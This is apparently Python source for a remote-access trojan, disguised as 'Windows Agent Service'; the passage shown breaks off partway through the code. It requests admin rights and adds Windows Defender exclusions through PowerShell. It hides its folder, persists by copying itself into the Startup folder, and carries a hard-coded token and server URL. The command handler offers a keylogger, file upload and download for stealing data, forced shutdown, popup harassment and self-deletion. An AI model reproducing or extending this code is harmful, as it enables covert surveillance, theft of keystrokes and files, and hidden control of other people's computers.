import ctypes
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer


# cd /d C:\Users\User\Desktop\telelluc
# python -m PyInstaller --onefile --noconsole --name "Windows Agent Service" telelluc.py

def request_admin_privileges():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
    except:
        pass

    admin_flag = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent", "admin_requested.flag")
    if os.path.exists(admin_flag):
        return False

    try:
        os.makedirs(os.path.dirname(admin_flag), exist_ok=True)
        with open(admin_flag, "w") as f:
            f.write("")
    except:
        pass

    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)
    except Exception:
        return False


PORT = 5005

AGENT_TOKEN = "ed81f9a6ad3fe1ba5587430863c983c2ea2c77239a158fa7"
LOG_AUTH_URL = "https://telelluc-log-auth.mrocadlectric.workers.dev"
HEARTBEAT_INTERVAL_SECONDS = 60
COMMAND_CHECK_INTERVAL_SECONDS = 5
INACTIVITY_THRESHOLD_SECONDS = 130
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) telelluc-agent"

device_id = None
last_command_time = time.time()
current_working_dir = 'C:\\Users'
clipboard_file = None
clipboard_cut = False
current_heartbeat_interval = HEARTBEAT_INTERVAL_SECONDS
current_command_check_interval = COMMAND_CHECK_INTERVAL_SECONDS
current_inactivity_threshold = INACTIVITY_THRESHOLD_SECONDS
mimetic_active = False
mimetic_log = []

# Command cooldowns (seconds between executions)
command_cooldowns = {
    'disk': 2,      # 2 seconds between disk queries
    'processes': 3, # 3 seconds between process listings
    'sysinfo': 3,   # 3 seconds between sysinfo queries
}
last_command_exec = {}  # Tracks last execution time for each command

ERROR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_error.vbs")
ACTIVATOR_VBS_PATH = os.path.join(tempfile.gettempdir(), "telelluc_activator.vbs")

ERROR_VBS_CONTENT = 'MsgBox "Error", 16 + 65536 + 4096, "Error"\n'
ACTIVATOR_VBS_CONTENT = (
    'Set shell = CreateObject("WScript.Shell")\n'
    "For i = 1 To 25\n"
    "    WScript.Sleep 200\n"
    "Next\n"
)

with open(ERROR_VBS_PATH, "w") as f:
    f.write(ERROR_VBS_CONTENT)

with open(ACTIVATOR_VBS_PATH, "w") as f:
    f.write(ACTIVATOR_VBS_CONTENT)

user32 = ctypes.windll.user32
HWND_TOPMOST = -1
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_SHOWWINDOW = 0x0040




def make_hidden(folder_path):
    """Mark a folder as hidden on Windows. Retries if locked. Returns True if successful."""
    if not os.path.exists(folder_path):
        return False

    for attempt in range(3):
        try:
            subprocess.run(
                f'attrib +h "{folder_path}"',
                shell=True,
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
                timeout=5
            )
            return True
        except:
            if attempt < 2:
                import time
                time.sleep(0.2)
    return False


def ensure_nircmd():
    nircmd_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent", "nircmd.exe")
    if os.path.exists(nircmd_path):
        return nircmd_path

    try:
        nircmd_dir = os.path.dirname(nircmd_path)
        os.makedirs(nircmd_dir, exist_ok=True)
        make_hidden(nircmd_dir)
        print("[nircmd] Downloading nircmd.exe...", flush=True)
        nircmd_url = "https://www.nirsoft.net/utils/nircmd.zip"
        zip_path = os.path.join(os.path.dirname(nircmd_path), "nircmd.zip")

        req = urllib.request.Request(nircmd_url, headers={"User-Agent": USER_AGENT})
        with urllib.request.urlopen(req, timeout=30) as response:
            with open(zip_path, "wb") as f:
                f.write(response.read())

        import zipfile
        with zipfile.ZipFile(zip_path, "r") as zip_ref:
            for file in zip_ref.namelist():
                if file.endswith("nircmd.exe"):
                    zip_ref.extract(file, os.path.dirname(nircmd_path))
                    extracted = os.path.join(os.path.dirname(nircmd_path), file)
                    if os.path.exists(extracted):
                        shutil.move(extracted, nircmd_path)
                        break

        try:
            os.remove(zip_path)
        except:
            pass

        print("[nircmd] Downloaded successfully", flush=True)
        return nircmd_path
    except Exception as e:
        print(f"[nircmd] Failed to download: {e}", flush=True)
        return None


def add_windows_defender_exclusion():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            startup_dir = os.path.join(
                os.environ.get("APPDATA", ""),
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup",
            )
            local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
            temp_dir = tempfile.gettempdir()

            for path in [local_dir, startup_dir, temp_dir]:
                try:
                    subprocess.run(
                        ["powershell", "-Command", f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"],
                        capture_output=True,
                        timeout=10,
                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                    )
                except:
                    pass
    except:
        pass


def _schedule_delete(path_to_delete):
    if not path_to_delete or not os.path.exists(path_to_delete):
        return False

    batch_lines = [
        "@echo off",
        "setlocal",
        "set \"target=%~1\"",
        ":retry",
        "del /f /q \"%target%\" 2>nul",
        "if exist \"%target%\" (",
        "  timeout /t 1 /nobreak >nul",
        "  goto :retry",
        ")",
        "exit /b 0",
    ]
    tmp_dir = tempfile.gettempdir()
    batch_path = os.path.join(tmp_dir, f"telelluc_delete_{int(time.time())}.bat")
    try:
        with open(batch_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(batch_lines) + "\n")
        subprocess.Popen(
            ["cmd", "/c", batch_path, path_to_delete],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )
        return True
    except Exception:
        return False


def ensure_startup():
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")

    try:
        os.makedirs(startup_dir, exist_ok=True)
    except OSError:
        return

    if getattr(sys, "frozen", False):
        source_exe = os.path.abspath(sys.executable)
        try:
            # Copy to startup if doesn't exist or if source is newer (compiled recently)
            if not os.path.exists(startup_exe):
                shutil.copy2(source_exe, startup_exe)
            elif os.path.getmtime(source_exe) > os.path.getmtime(startup_exe):
                shutil.copy2(source_exe, startup_exe)

            # Migration logic: if startup copy exists and is different from current exe
            if os.path.exists(startup_exe) and os.path.exists(source_exe) and os.path.abspath(source_exe) != os.path.abspath(startup_exe):
                try:
                    # IMPORTANT: Use >= not > because shutil.copy2() preserves timestamps
                    # After copying, startup and source will have EQUAL timestamps
                    # >= condition catches both "just copied" (equal) and "was recently executed" (newer) cases
                    # This ensures the executable always runs from startup on each launch
                    if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
                        # Launch startup version
                        subprocess.Popen(
                            [startup_exe],
                            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                        )
                        # Schedule delete and wait briefly for startup to take over
                        _schedule_delete(source_exe)
                        time.sleep(1)
                        os._exit(0)
                except OSError:
                    pass
        except OSError:
            pass


def mimetic_keylogger():
    """Capture keyboard indefinitely until ESC or 1 minute inactivity - supports all characters."""
    log = []
    last_key_time = time.time()
    inactivity_timeout = 60  # 1 minute

    try:
        user32 = ctypes.windll.user32
        GetAsyncKeyState = user32.GetAsyncKeyState
        GetKeyboardState = user32.GetKeyboardState
        ToUnicodeEx = user32.ToUnicodeEx
        GetKeyboardLayout = user32.GetKeyboardLayout
    except Exception:
        return "Error: Could not access Windows API"

    # Key codes for special keys
    VK_ESCAPE = 0x1B
    key_map = {
        0x20: '[SPACE]', 0x0D: '[ENTER]', 0x09: '[TAB]',
        0x08: '[BACKSPACE]', 0x2E: '[DELETE]'
    }

    try:
        pressed_keys = set()
        keyboard_state = ctypes.c_ubyte * 256

        while True:
            current_time = time.time()

            # Check if inactive for 60 seconds
            if current_time - last_key_time >= inactivity_timeout:
                break

            # Check all keys (0-255)
            for vk_code in range(256):
                key_state = GetAsyncKeyState(vk_code)
                is_pressed = bool(key_state & 0x8000)

                # Detect key state change
                if is_pressed and vk_code not in pressed_keys:
                    pressed_keys.add(vk_code)
                    last_key_time = current_time

                    # Check for ESC to exit immediately
                    if vk_code == VK_ESCAPE:
                        result = ''.join(log)
                        return result if result else "No keys recorded"

                    # Map special keys first
                    if vk_code in key_map:
                        log.append(key_map[vk_code])
                    else:
                        # Try to convert virtual key to unicode character
                        try:
                            kb_state = keyboard_state()
                            GetKeyboardState(ctypes.byref(kb_state))
                            layout = GetKeyboardLayout(0)

                            # Buffer for unicode output
                            unicode_buffer = ctypes.c_wchar * 5
                            result_buffer = unicode_buffer()

                            # Convert key to unicode
                            result = ToUnicodeEx(
                                vk_code, 0, ctypes.byref(kb_state),
                                ctypes.byref(result_buffer), 5, 0, layout
                            )

                            if result > 0:
                                char = result_buffer.value
                                if char:
                                    log.append(char)
                            elif 0x30 <= vk_code <= 0x39:  # Fallback for numbers
                                log.append(chr(vk_code))
                            elif 0x41 <= vk_code <= 0x5A:  # Fallback for letters
                                log.append(chr(vk_code).lower())
                        except:
                            # Fallback to basic mapping
                            if 0x30 <= vk_code <= 0x39:
                                log.append(chr(vk_code))
                            elif 0x41 <= vk_code <= 0x5A:
                                log.append(chr(vk_code).lower())

                elif not is_pressed and vk_code in pressed_keys:
                    pressed_keys.discard(vk_code)

            # Sleep to avoid CPU usage
            time.sleep(0.05)

        result = ''.join(log)
        return result if result else "No keys recorded"

    except Exception as e:
        return f"Error: {str(e)}"


def restart_agent():
    """Restart the agent gracefully."""
    try:
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception:
        try:
            import signal
            os.kill(os.getpid(), signal.SIGTERM)
        except:
            os._exit(1)


def self_delete_agent(trigger_id):
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
    current_exe = os.path.abspath(sys.executable) if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
    local_exe = os.path.join(local_dir, "TelellucAgent.exe")

    legacy_startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
    legacy_local_exe = os.path.join(local_dir, "Windows Agent Service.exe")

    candidates = []
    for path in [startup_exe, current_exe, local_exe, legacy_startup_exe, legacy_local_exe]:
        if path and os.path.exists(path):
            candidates.append(os.path.abspath(path))

    try:
        if os.path.exists(local_dir):
            shutil.rmtree(local_dir, ignore_errors=True)
        legacy_folder = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Windows Agent Service")
        if os.path.exists(legacy_folder):
            shutil.rmtree(legacy_folder, ignore_errors=True)
    except:
        pass

    batch_lines = [
        "@echo off",
        "setlocal EnableDelayedExpansion",
        "set \"parent_pid=%~1\"",
        "shift",
        ":loop",
        "if \"%~1\"==\"\" goto cleanup",
        "if exist \"%~1\" (",
        "  set \"target=%~1\"",
        "  set \"dir=%~dp1\"",
        "  set \"name=%~nx1\"",
        "  set \"renamed=!name!.deleted_!random!\"",
        "  ren \"!target!\" \"!renamed!\" 2>nul",
        "  if !errorlevel! equ 0 (",
        "    ping -n 2 127.0.0.1 >nul",
        "    taskkill /F /PID !parent_pid! >nul 2>&1",
        "    ping -n 2 127.0.0.1 >nul",
        "    del /f /q \"!dir!!renamed!\" >nul 2>&1",
        "  )",
        ")",
        "shift",
        "goto loop",
        ":cleanup",
        f"attrib -h \"{local_dir}\" 2>nul",
        f"timeout /t 1 /nobreak >nul",
        f"rmdir /s /q \"{local_dir}\" 2>nul",
        f"timeout /t 1 /nobreak >nul",
        f"rmdir /s /q \"{local_dir}\" 2>nul",
        f"timeout /t 1 /nobreak >nul",
        f"rmdir /s /q \"{local_dir}\" 2>nul",
        f"timeout /t 1 /nobreak >nul",
        f"for /r \"{local_dir}\" %%f in (*) do del /f /q \"%%f\" 2>nul",
        f"timeout /t 1 /nobreak >nul",
        f"rmdir /s /q \"{local_dir}\" 2>nul",
        "del /f /q \"%temp%\\telelluc*.bat\" 2>nul",
        "del /f /q \"%temp%\\telelluc*.vbs\" 2>nul",
        "timeout /t 2 /nobreak >nul",
        "exit /b 0",
    ]

    tmp_dir = tempfile.gettempdir()
    batch_path = os.path.join(tmp_dir, f"telelluc_self_delete_{int(time.time())}.bat")
    try:
        with open(batch_path, "w", encoding="utf-8") as fh:
            fh.write("\n".join(batch_lines) + "\n")
        subprocess.Popen(
            ["cmd", "/c", batch_path, str(os.getpid()), *candidates],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
        )
    except Exception:
        pass

    return


def _find_error_window():
    result = []

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    def _enum(hwnd, _lparam):
        if user32.IsWindowVisible(hwnd):
            buf = ctypes.create_unicode_buffer(256)
            user32.GetWindowTextW(hwnd, buf, 256)
            if buf.value.strip() == "Error":
                result.append(hwnd)
                return False
        return True

    user32.EnumWindows(_enum, 0)
    return result[0] if result else None


def _force_topmost():
    for _ in range(60):
        hwnd = _find_error_window()
        if hwnd:
            for _ in range(10):
                user32.SetWindowPos(
                    hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                )
                time.sleep(0.2)
            return
        time.sleep(0.05)


def show_error():
    subprocess.Popen(["wscript.exe", ERROR_VBS_PATH])
    subprocess.Popen(["wscript.exe", ACTIVATOR_VBS_PATH])
    _force_topmost()


def format_size(bytes_size):
    if bytes_size < 1024:
        return f"{int(bytes_size)}B"
    elif bytes_size < 1024 * 1024:
        return f"{bytes_size / 1024:.1f}KB"
    elif bytes_size < 1024 * 1024 * 1024:
        return f"{bytes_size / (1024 * 1024):.1f}MB"
    else:
        return f"{bytes_size / (1024 * 1024 * 1024):.1f}GB"


def check_command_cooldown(cmd_name):
    global last_command_exec

    if cmd_name not in command_cooldowns:
        return True, 0  # No cooldown for this command

    cooldown_required = command_cooldowns[cmd_name]
    last_exec = last_command_exec.get(cmd_name, 0)
    time_since_last = time.time() - last_exec

    if time_since_last < cooldown_required:
        wait_time = cooldown_required - time_since_last
        return False, wait_time

    # Update last execution time
    last_command_exec[cmd_name] = time.time()
    return True, 0


def execute_shell_command(cmd_str):
    global current_working_dir
    global clipboard_file
    global clipboard_cut

    try:
        # Clean input - ensure no buffering issues between commands
        cmd_str = cmd_str.strip().replace('\x00', '').replace('\r', '')
        cmd_lower = cmd_str.lower().strip()

        # Handle cd command
        if cmd_lower.startswith("cd ") or cmd_lower.startswith("cd/"):
            path = cmd_str[3:].strip().strip('"').strip("'")
            try:
                if path.lower() == "..":
                    current_working_dir = os.path.dirname(current_working_dir)
                else:
                    full_path = os.path.abspath(os.path.join(current_working_dir, path))
                    if os.path.isdir(full_path):
                        current_working_dir = full_path
                    else:
                        return f"Error: The system cannot find the path specified."
                os.chdir(current_working_dir)
                return current_working_dir
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle dir/ls command
        if cmd_lower.startswith("dir") or cmd_lower == "ls":
            try:
                def get_dir_size(path, max_depth=2, current_depth=0):
                    """Get directory size with depth limit to avoid timeout on large dirs."""
                    if current_depth >= max_depth:
                        return 0
                    total = 0
                    try:
                        for entry in os.scandir(path):
                            try:
                                if entry.is_file():
                                    total += entry.stat().st_size
                                elif entry.is_dir() and current_depth < max_depth - 1:
                                    total += get_dir_size(entry.path, max_depth, current_depth + 1)
                            except:
                                pass
                    except:
                        pass
                    return total

                os.chdir(current_working_dir)
                items = []
                try:
                    for item in sorted(os.listdir(current_working_dir)):
                        full_path = os.path.join(current_working_dir, item)
                        try:
                            if os.path.isdir(full_path):
                                dir_size = get_dir_size(full_path)
                                size_str = format_size(dir_size)
                                items.append((item, size_str, "[DIR]"))
                            else:
                                size = os.path.getsize(full_path)
                                size_str = format_size(size)
                                items.append((item, size_str, "[ARC]"))
                        except:
                            items.append((item, "?", "[ARC]"))
                except Exception as e:
                    return f"Error: {str(e)}"

                if not items:
                    return "Directory is empty"

                # Format output with perfectly aligned columns (fixed width)
                output_lines = []
                # Header with exact column alignment
                header = f"{'Name':<40}  {'Size':>10}  {'Type':<8}"
                output_lines.append(header)
                output_lines.append("─" * len(header))

                for name, size_str, type_str in items:
                    # Truncate long names to fit column (40 chars max)
                    display_name = name if len(name) <= 40 else name[:37] + "..."

                    line = f"{display_name:<40}  {size_str:>10}  {type_str:<8}"
                    output_lines.append(line)

                output = "\n".join(output_lines)
                lines = output.split("\n")
                if len(lines) > 112:
                    more_count = len(lines) - 110
                    output = "\n".join(lines[:110]) + f"\n  ... and {more_count} more items"
                return output
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle pwd command
        if cmd_lower == "pwd":
            return current_working_dir

        if cmd_lower == "cd" and len(cmd_str.strip()) == 2:
            return current_working_dir

        # Handle error command
        if cmd_lower.startswith("__error__"):
            try:
                cantidad = 1
                message = "Error"

                if ":" in cmd_str:
                    parts = cmd_str.split(":", 2)
                    if len(parts) > 1:
                        try:
                            cantidad = int(parts[1].strip())
                        except ValueError:
                            cantidad = 1
                    if len(parts) > 2:
                        message = parts[2].strip()

                vbs_path = os.path.join(tempfile.gettempdir(), "telelluc_error_custom.vbs")
                vbs_content = f'MsgBox "{message}", 16 + 65536 + 4096, "Message"\n'
                with open(vbs_path, "w", encoding="utf-8") as f:
                    f.write(vbs_content)

                for _ in range(cantidad):
                    subprocess.Popen(["wscript.exe", vbs_path],
                        creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)

                return f"Message popup(s) triggered: {cantidad}x '{message}'"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle shutdown command
        if cmd_lower.startswith("__shutdown__"):
            try:
                seconds = "0"
                if ":" in cmd_str:
                    parts = cmd_str.split(":")
                    if len(parts) > 1:
                        seconds = parts[1].strip()
                subprocess.Popen(["shutdown", "/s", "/t", seconds],
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
                return f"Shutdown initiated ({seconds}s)" if seconds != "0" else "Shutdown initiated"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle reboot command
        if cmd_lower.startswith("__reboot__"):
            try:
                seconds = "0"
                if ":" in cmd_str:
                    parts = cmd_str.split(":")
                    if len(parts) > 1:
                        seconds = parts[1].strip()
                subprocess.Popen(["shutdown", "/r", "/t", seconds],
                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0)
                return f"Reboot initiated ({seconds}s)" if seconds != "0" else "Reboot initiated"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle agent restart command
        if cmd_lower.startswith("__restart__"):
            try:
                threading.Thread(target=restart_agent, daemon=False).start()
                return "Agent restarting..."
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle mimetic (keylogger) command
        # Handle reset directory command (called when entering control mode)
        if cmd_lower.startswith("__reset_dir__"):
            try:
                current_working_dir = 'C:\\Users'
                os.chdir(current_working_dir)
                return ""  # Silent return
            except Exception as e:
                return f"Error: {str(e)}"

        if cmd_lower.startswith("__mimetic__"):
            try:
                result = mimetic_keylogger()
                return result
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle nano command
        if cmd_lower.startswith("nano "):
            filename = cmd_str[5:].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
                if not os.path.exists(full_path):
                    return f"[NANO_EDIT:{filename}]\n\n[END_NANO]"
                with open(full_path, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read()
                return f"[NANO_EDIT:{filename}]\n{content}\n[END_NANO]"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle nano save command (internal)
        if cmd_lower.startswith("__nano_save__:"):
            try:
                parts = cmd_str.split(":", 2)
                if len(parts) < 3:
                    return ""
                filename = parts[1].strip()
                content = parts[2]
                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
                with open(full_path, "w", encoding="utf-8") as f:
                    f.write(content)
                return ""
            except Exception as e:
                return ""

        # Handle upload command
        if cmd_lower.startswith("__upload__|"):
            try:
                # IMPORTANT: Uses "|" delimiter, NOT ":" because Windows paths contain "C:\"
                # Splitting on ":" would break at drive letter (C:) instead of delimiter
                # Format: __upload__|path/to/file|base64content
                parts = cmd_str.split("|", 2)
                if len(parts) < 3:
                    return "Error: Invalid upload command"
                filepath = parts[1].strip()
                file_content_b64 = parts[2]

                # Estimate decoded size: base64 adds ~33% overhead, so multiply by 0.75 to get approximate original size
                file_size = len(file_content_b64) * 0.75
                if file_size > 10 * 1024 * 1024:
                    return f"Error: File too large. Maximum is 10MB"

                import base64
                try:
                    file_content = base64.b64decode(file_content_b64)
                except:
                    return "Error: Invalid base64 data"

                full_path = os.path.abspath(os.path.join(current_working_dir, filepath))
                os.makedirs(os.path.dirname(full_path), exist_ok=True)
                with open(full_path, "wb") as f:
                    f.write(file_content)
                return f"File uploaded: {os.path.basename(full_path)}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle get command (download file)
        if cmd_lower.startswith("get "):
            filename = cmd_str[4:].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
                if not os.path.exists(full_path):
                    return f"Error: File not found: {filename}"
                if os.path.isdir(full_path):
                    return f"Error: {filename} is a directory"

                file_size = os.path.getsize(full_path)
                if file_size > 10 * 1024 * 1024:
                    size_mb = file_size / (1024 * 1024)
                    return f"Error: File too large ({size_mb:.1f}MB). Maximum is 10MB"

                import base64
                with open(full_path, "rb") as f:
                    file_content = f.read()
                    encoded = base64.b64encode(file_content).decode('utf-8')
                return f"__GET_FILE__:{encoded}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle cat command
        if cmd_lower.startswith("cat "):
            filename = cmd_str[4:].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
                if not os.path.exists(full_path):
                    return f"Error: File not found: {filename}"
                if os.path.isdir(full_path):
                    return f"Error: {filename} is a directory"
                with open(full_path, "r", encoding="utf-8", errors="replace") as f:
                    content = f.read()
                return content if content else "(empty file)"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle mkdir command
        if cmd_lower.startswith("mkdir "):
            dirname = cmd_str[6:].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, dirname))
                if os.path.exists(full_path):
                    return f"Error: Directory already exists: {dirname}"
                os.makedirs(full_path)
                return f"Directory created: {dirname}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle move command
        if cmd_lower.startswith("move "):
            parts = cmd_str.split(None, 2)
            if len(parts) < 3:
                return "Error: move requires source and destination"
            source = parts[1].strip().strip('"').strip("'")
            dest = parts[2].strip().strip('"').strip("'")
            try:
                source_path = os.path.abspath(os.path.join(current_working_dir, source))
                dest_path = os.path.abspath(os.path.join(current_working_dir, dest))
                if not os.path.exists(source_path):
                    return f"Error: File not found: {source}"
                import shutil
                if os.path.isdir(source_path):
                    shutil.move(source_path, dest_path)
                    return f"Directory moved: {source} -> {dest}"
                else:
                    shutil.move(source_path, dest_path)
                    return f"File moved: {source} -> {dest}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle delete/rm command
        if cmd_lower.startswith("delete ") or cmd_lower.startswith("rm "):
            parts = cmd_str.split(None, 1)
            if len(parts) < 2:
                return "Error: delete requires a filename"
            filename = parts[1].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, filename))
                if not os.path.exists(full_path):
                    return f"Error: File not found: {filename}"
                if os.path.isdir(full_path):
                    import shutil
                    import stat
                    def handle_remove_error(func, path, exc):
                        if not os.access(path, os.W_OK):
                            os.chmod(path, stat.S_IWUSR | stat.S_IRUSR | stat.S_IXUSR)
                            func(path)
                        else:
                            raise exc
                    shutil.rmtree(full_path, onexc=handle_remove_error)
                    return f"Directory deleted: {filename}"
                else:
                    os.chmod(full_path, 0o777)
                    os.remove(full_path)
                    return f"File deleted: {filename}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle copy command
        if cmd_lower.startswith("copy "):
            source = cmd_str[5:].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, source))
                if not os.path.exists(full_path):
                    return f"Error: File not found: {source}"
                clipboard_file = full_path
                clipboard_cut = False
                filename = os.path.basename(full_path)
                return f"Copied: {filename}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle cut command
        if cmd_lower.startswith("cut "):
            source = cmd_str[4:].strip().strip('"').strip("'")
            try:
                full_path = os.path.abspath(os.path.join(current_working_dir, source))
                if not os.path.exists(full_path):
                    return f"Error: File not found: {source}"
                clipboard_file = full_path
                clipboard_cut = True
                filename = os.path.basename(full_path)
                return f"Cut: {filename}"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle paste command
        if cmd_lower == "paste" or cmd_lower.startswith("paste "):
            try:
                if not clipboard_file:
                    return "Error: Nothing to paste (use 'copy <file>' or 'cut <file>' first)"
                if not os.path.exists(clipboard_file):
                    return "Error: Clipboard file no longer exists"

                dest = None
                if cmd_lower.startswith("paste "):
                    dest = cmd_str[6:].strip().strip('"').strip("'")

                if dest:
                    dest_path = os.path.abspath(os.path.join(current_working_dir, dest))
                else:
                    dest_path = os.path.abspath(os.path.join(current_working_dir, os.path.basename(clipboard_file)))

                import shutil
                if os.path.isdir(clipboard_file):
                    shutil.copytree(clipboard_file, dest_path)
                    msg = f"Directory pasted: {os.path.basename(dest_path)}"
                else:
                    shutil.copy2(clipboard_file, dest_path)
                    msg = f"File pasted: {os.path.basename(dest_path)}"

                if clipboard_cut:
                    try:
                        if os.path.isdir(clipboard_file):
                            shutil.rmtree(clipboard_file)
                        else:
                            os.remove(clipboard_file)
                        msg += " (cut)"
                    except:
                        pass
                    clipboard_file = None
                    clipboard_cut = False

                return msg
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle sysinfo command
        if cmd_lower == "sysinfo":
            allowed, wait_time = check_command_cooldown('sysinfo')
            if not allowed:
                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
            try:
                result = subprocess.run(["systeminfo"], capture_output=True, text=True, timeout=10)
                return result.stdout.strip() if result.stdout else "Unable to retrieve system info"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle disk command (with optional disk number parameter)
        if cmd_lower.startswith("disk"):
            allowed, wait_time = check_command_cooldown('disk')
            if not allowed:
                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
            try:
                import shutil
                import string

                # Parse optional disk parameter (e.g., "disk" or "disk 0" or "disk c")
                parts = cmd_str.split()
                disk_arg = parts[1].upper() if len(parts) > 1 else "C"

                # Normalize to drive letter (0->C, 1->D, etc.)
                if disk_arg.isdigit():
                    disk_num = int(disk_arg)
                    available_drives = [d for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
                    if disk_num >= len(available_drives):
                        return f"Error: Disk {disk_num} does not exist. Available: {', '.join(available_drives)}"
                    disk_letter = available_drives[disk_num]
                else:
                    disk_letter = disk_arg if len(disk_arg) == 1 else disk_arg[0]
                    if not os.path.exists(f"{disk_letter}:\\"):
                        return f"Error: Drive {disk_letter}:\\ does not exist"

                path = f"{disk_letter}:\\"
                total, used, free = shutil.disk_usage(path)
                total_gb = total / (1024**3)
                used_gb = used / (1024**3)
                free_gb = free / (1024**3)

                # Calculate percentage used
                percent_used = (used_gb / total_gb * 100) if total_gb > 0 else 0

                return f"{disk_letter}: | Total: {total_gb:.2f}GB | Used: {used_gb:.2f}GB | Free: {free_gb:.2f}GB ({percent_used:.1f}%)"
            except Exception as e:
                return f"Error: {str(e)}"

        # Handle processes command - show running processes (main process only)
        if cmd_lower == "processes":
            allowed, wait_time = check_command_cooldown('processes')
            if not allowed:
                return f"Cooldown active. Try again in {wait_time:.1f} seconds."
            try:
                # Execute tasklist twice for reliability (first attempt often fails)
                result = None
                for _ in range(2):
                    result = subprocess.run(["tasklist", "/fo", "csv"], capture_output=True, text=True, timeout=15)
                    if result.stdout and len(result.stdout.strip().split("\n")) > 2:
                        break

                if not result or not result.stdout:
                    return "No processes running"

                lines = result.stdout.strip().split("\n")
                if len(lines) < 2:
                    return "No processes running"

                # Keywords for interesting processes
                keywords = [
                    'chrome', 'firefox', 'edge', 'opera', 'safari', 'brave', 'iexplore',
                    'discord', 'telegram', 'slack', 'skype', 'teams', 'whatsapp',
                    'spotify', 'vlc', 'audacity', 'winamp', 'foobar',
                    'code', 'sublime', 'notepad', 'atom', 'vim', 'emacs', 'gedit',
                    'python', 'node', 'java', 'rust', 'golang', 'ruby',
                    'steam', 'epic', 'origin', 'uplay', 'battle',
                    'visual studio', 'intellij', 'pycharm', 'rider',
                    'blender', 'photoshop', 'illustrator', 'premiere', 'gimp',
                    'obs', 'twitch', 'youtube', 'streamlabs',
                    'git', 'docker', 'putty', 'winscp', '7zip', 'winrar', 'everything',
                    'windows agent service', 'telelluc', 'msedgewebview2', 'ms-teams', 'msedge', 'ms-edge',
                    'vscode', 'vs code'
                ]

                # Header
                output_lines = ["Image Name                     PID"]
                output_lines.append("=================================================")

